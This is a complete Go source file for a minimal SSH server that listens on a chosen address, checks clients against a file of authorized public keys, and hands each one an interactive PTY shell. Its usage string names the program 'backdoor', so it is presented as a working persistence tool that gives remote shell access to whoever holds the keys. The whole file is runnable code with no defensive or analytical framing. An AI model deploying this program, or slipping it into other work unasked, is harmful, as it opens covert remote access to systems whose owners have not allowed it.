package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"github.com/creack/pty"
	"github.com/gliderlabs/ssh"
)

func setWinsize(f *os.File, w, h int) {
	syscall.Syscall(syscall.SYS_IOCTL, f.Fd(), uintptr(syscall.TIOCSWINSZ),
		uintptr(unsafe.Pointer(&struct{ h, w, x, y uint16 }{uint16(h), uint16(w), 0, 0})))
}

func main() {
	flag.Parse()
	if flag.NArg() < 3 {
		panic("no command provided: backdoor <shell-path> <bind-address-for-ssh> <authorized-keys-file>")
	}
	shellPath := flag.Arg(0)
	bindAddr := flag.Arg(1)
	pubKeyFile := flag.Arg(2)
	pubKeyBytes, err := os.ReadFile(pubKeyFile)
	if err != nil {
		panic(fmt.Errorf("unable to read the public key file '%s': %w", pubKeyFile, err))
	}

	var authorizedKeys []ssh.PublicKey
	for bytes := pubKeyBytes; len(bytes) > 0; {
		authorizedKey, comment, options, rest, err := ssh.ParseAuthorizedKey(bytes)
		if err != nil {
			panic(fmt.Errorf("unable to parse the public key '%s': %w", bytes, err))
		}
		bytes, _, _ = rest, comment, options
		authorizedKeys = append(authorizedKeys, authorizedKey)
	}

	publicKeyOption := ssh.PublicKeyAuth(func(ctx ssh.Context, key ssh.PublicKey) bool {
		for _, authorizedKey := range authorizedKeys {
			if ssh.KeysEqual(key, authorizedKey) {
				return true
			}
		}
		return false
	})

	ssh.Handle(func(s ssh.Session) {
		cmd := exec.Command(shellPath)
		ptyReq, winCh, isPty := s.Pty()
		if isPty {
			cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
			f, err := pty.Start(cmd)
			if err != nil {
				panic(err)
			}
			go func() {
				for win := range winCh {
					setWinsize(f, win.Width, win.Height)
				}
			}()
			go func() {
				io.Copy(f, s) // stdin
			}()
			io.Copy(s, f) // stdout
			cmd.Wait()
		} else {
			io.WriteString(s, "No PTY requested.\n")
			s.Exit(1)
		}
	})

	log.Printf("starting ssh server at %s...", bindAddr)
	log.Fatal(ssh.ListenAndServe(bindAddr, nil, publicKeyOption))
}
